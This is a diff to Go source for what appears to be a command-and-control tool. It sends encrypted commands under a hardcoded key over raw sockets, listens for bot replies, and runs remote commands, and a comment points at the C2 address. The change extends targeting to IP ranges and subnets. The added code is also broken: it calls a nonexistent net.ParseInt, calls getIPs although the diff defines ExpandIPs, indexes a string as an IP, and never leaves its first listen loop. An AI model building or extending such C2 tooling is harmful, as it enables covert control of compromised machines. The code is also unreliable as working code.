@@ -362,26 +362,26 @@ func CreateHello(hostMAC net.HardwareAddr, srcIP net.IP) (hello string) {
 	//get hostname
 	hostname, err := os.Hostname()
 	if err != nil {
-		log.Fatal("Hostname not found...")
+		log.Fatal("[-] Hostname not found...")
 	}
 
 	//create base text
 	hello = "HELLO:" + "#" + hostname + "#" + hostMAC.String() + "#" + srcIP.String()
 	
 	//Encrypt Command
-	if debugCheck != "" { fmt.Printf("Attempting to encrypt: %s\n", os.Args[2]) }
+	if debugCheck != "" { fmt.Printf("[]Attempting to encrypt: %s\n", os.Args[2]) }
 	plaintext := []byte(os.Args[2])
 	key := []byte("pooppooppooppoop")
 	ciphertext, err := encrypt(plaintext, key)
 	if err != nil {
 		panic(err)
 	}
-	if debugCheck != "" { fmt.Printf("Encrypted: %x\n", ciphertext) }
+	if debugCheck != "" { fmt.Printf("[+]Encrypted: %x\n", ciphertext) }
 	hello += "#" + string(ciphertext)
 
 	for i := 3; i < len(os.Args); i++ {
 		hello += "#" + os.Args[i]
-		if debugCheck != "" { fmt.Printf("Added optional commands: %s\n", os.Args[i]) }
+		if debugCheck != "" { fmt.Printf("[+]Added optional commands: %s\n", os.Args[i]) }
 	}
 
 
@@ -500,6 +500,77 @@ func execCommand(command string) {
 
 }
 
+
+// Function that takes a string representation of a single IP address, IP range, or VLSM network
+// and returns an array of all the individual IP addresses contained within.
+func ExpandIPs(ipStr string) []string {
+	var ips []string
+
+	// Check if the input is a valid IP address
+	ip := net.ParseIP(ipStr)
+	if ip != nil {
+		// If the input is a single IP address, add it to the list and return it
+		ips = append(ips, ip.String())
+		return ips
+	}
+
+	// Check if the input is an IP range in CIDR notation
+	_, ipnet, err := net.ParseCIDR(ipStr)
+	if err == nil {
+		// If the input is an IP range, iterate over all the IP addresses in the range
+		for ip := ipnet.IP.Mask(ipnet.Mask); ipnet.Contains(ip); inc(ip) {
+			ips = append(ips, ip.String())
+		}
+		return ips
+	}
+
+	// Check if the input is a VLSM network in the format "192.168.0.0/24=16,32"
+	parts := strings.Split(ipStr, "=")
+	if len(parts) != 2 {
+		// If the input is not a valid IP address, IP range, or VLSM network, return an empty list
+		return ips
+	}
+
+	// Parse the base network and subnet mask from the first part of the input
+	_, ipnet, err = net.ParseCIDR(parts[0])
+	if err != nil {
+		return ips
+	}
+
+	// Parse the comma-separated list of subnet sizes from the second part of the input
+	subnets := strings.Split(parts[1], ",")
+	for _, subnetStr := range subnets {
+		// Parse the subnet size and calculate the number of IP addresses it contains
+		subnetSize, err := net.ParseInt(subnetStr, 10, 64)
+		if err != nil {
+			return ips
+		}
+		numIps := 1 << uint32(32-subnetSize)
+
+		// Iterate over all the IP addresses in the subnet and add them to the list
+		for i := 0; i < numIps; i++ {
+			ip := ipnet.IP.To4()
+			ip = net.IPv4(ip[0], ip[1], ip[2], ip[3]+byte(i))
+			ips = append(ips, fmt.Sprintf("%s/32", ip.String()))
+		}
+
+		// Move the IP network to the next subnet
+		inc(ipnet.IP)
+	}
+
+	return ips
+}
+
+// Function to increment an IP address by one
+func inc(ip net.IP) {
+	for j := len(ip) - 1; j >= 0; j-- {
+		ip[j]++
+		if ip[j] > 0 {
+			break
+		}
+	}
+}
+
 func main() {
 
 
@@ -507,7 +578,7 @@ func main() {
 	
 	//Vaidate parameters
 	if len(os.Args) < 3 {
-        	fmt.Println("Usage: myprogram <ip address> \"<command>\" \"<ping[optional]>\" \"<debug[optional]>\"") 
+        	fmt.Println("Usage: myprogram <ip address, range, or vlsm> \"<command>\" \"<ping[optional]>\" \"<debug[optional]>\"") 
        	 	os.Exit(1)
    	 }
    	 
@@ -520,53 +591,61 @@ func main() {
 		}
 	} 
 	
-	// Check for valid IP
-	ip := net.ParseIP(os.Args[1])
-	if ip == nil {
-        	if debugCheck != "" { fmt.Println("Invalid IP address:", os.Args[1]) }
-        	os.Exit(1)
-    	}
+	// // Check for valid IP
+	// ip := net.ParseIP(os.Args[1])
+	// if ip == nil {
+    //     	if debugCheck != "" { fmt.Println("[-]Invalid IP address:", os.Args[1]) }
+    //     	os.Exit(1)
+    // 	}
 
-	// Create BPF filter vm
-	vm := CreateBPFVM(FilterRaw)
 
-	// Create reading socket
-	readfd := NewSocket()
-	defer unix.Close(readfd)
+    ips, err := getIPs(os.Args[1])
+	if err == nil {
+		for _, ip := range ips {
+			if debugCheck != "" { fmt.Println("[+] IP Parsed: ", ip) }
 
-	if debugCheck != "" { fmt.Println("[+] Socket created") }
+			// Create BPF filter vm
+			vm := CreateBPFVM(FilterRaw)
 
-	// Get information that is needed for networking
-	
-	tmp := os.Args[1]+":80"
-	iface, src := GetOutwardIface(tmp)
-	fmt.Println("[+] Using interface:", iface.Name)
+			// Create reading socket
+			readfd := NewSocket()
+			defer unix.Close(readfd)
 
-	dstMAC, err := GetRouterMAC(iface.Name)
-	if err != nil {
-		log.Fatal(err)
-	}
-	if debugCheck != "" { fmt.Println("[+] DST MAC:", dstMAC.String()) }
-	if debugCheck != "" { fmt.Println("[+] Starting HELLO timer") }
+			if debugCheck != "" { fmt.Println("[+] Socket created") }
 
-	// Start hello timer
-	// Set the below IP to the IP of the C2
-	// 192.168.4.6
-/*	macStr := "00:1b:17:00:01:11"
-	dstMAC,err = net.ParseMAC(macStr)
-	if err != nil {
-       	 fmt.Println("Error parsing MAC address:", err)
-        	return
-    	}
-*/
-	go sendHello(iface, src, net.IPv4(ip[12], ip[13], ip[14], ip[15]), dstMAC)
+			// Get information that is needed for networking
+			
+			tmp := os.Args[1]+":80"
+			iface, src := GetOutwardIface(tmp)
+			fmt.Println("[+] Using interface:", iface.Name)
 
-	// Listen for responses
-	if debugCheck != "" { fmt.Println("[+] Listening") }
-	for {
-		packet, target := BotReadPacket(readfd, vm)
-		if packet != nil {
-			go botProcessPacket(packet, target, src)
+			dstMAC, err := GetRouterMAC(iface.Name)
+			if err != nil {
+				log.Fatal(err)
+			}
+			if debugCheck != "" { fmt.Println("[+] DST MAC:", dstMAC.String()) }
+			if debugCheck != "" { fmt.Println("[+] Starting HELLO timer") }
+
+			// Start hello timer
+			// Set the below IP to the IP of the C2
+			// 192.168.4.6
+		/*	macStr := "00:1b:17:00:01:11"
+			dstMAC,err = net.ParseMAC(macStr)
+			if err != nil {
+		       	 fmt.Println("Error parsing MAC address:", err)
+		        	return
+		    	}
+		*/
+			go sendHello(iface, src, net.IPv4(ip[12], ip[13], ip[14], ip[15]), dstMAC)
+
+			// Listen for responses
+			if debugCheck != "" { fmt.Println("[+] Listening") }
+			for {
+				packet, target := BotReadPacket(readfd, vm)
+				if packet != nil {
+					go botProcessPacket(packet, target, src)
+				}
+			}
 		}
 	}
 
